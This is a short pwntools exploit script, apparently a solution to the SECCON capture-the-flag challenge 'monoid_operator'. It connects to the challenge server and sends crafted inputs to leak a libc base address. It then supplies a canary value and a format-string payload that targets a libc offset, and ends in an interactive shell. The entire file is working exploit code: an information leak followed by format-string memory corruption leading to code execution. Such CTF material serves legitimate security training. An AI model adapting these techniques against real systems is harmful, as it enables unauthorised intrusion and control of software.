from pwn import *

#p = process("./monoid_operator")
p = remote("monoidoperator.chal.seccon.jp",27182) 

p.sendlineafter("?","+")
p.sendlineafter("?","136")

for i in range(136):
	print i
	p.sendline("1"*0x400)

p.sendlineafter("?","+")

p.sendlineafter("?","136")
p.sendline("+")
for i in range(135):
	print i
	p.sendline("0")

p.recvuntil("is ")
libc = int(p.recvuntil(".")[:-1]) - 0x1e4ca0
print hex(libc)

p.sendlineafter("?","q")
p.sendafter("?",p64(libc+0x1ec569)[:-1]) #canary
p.sendafter("?","%1031c%c%c%13$.7s%8d"+p64(libc+0x106ef8))

p.interactive()
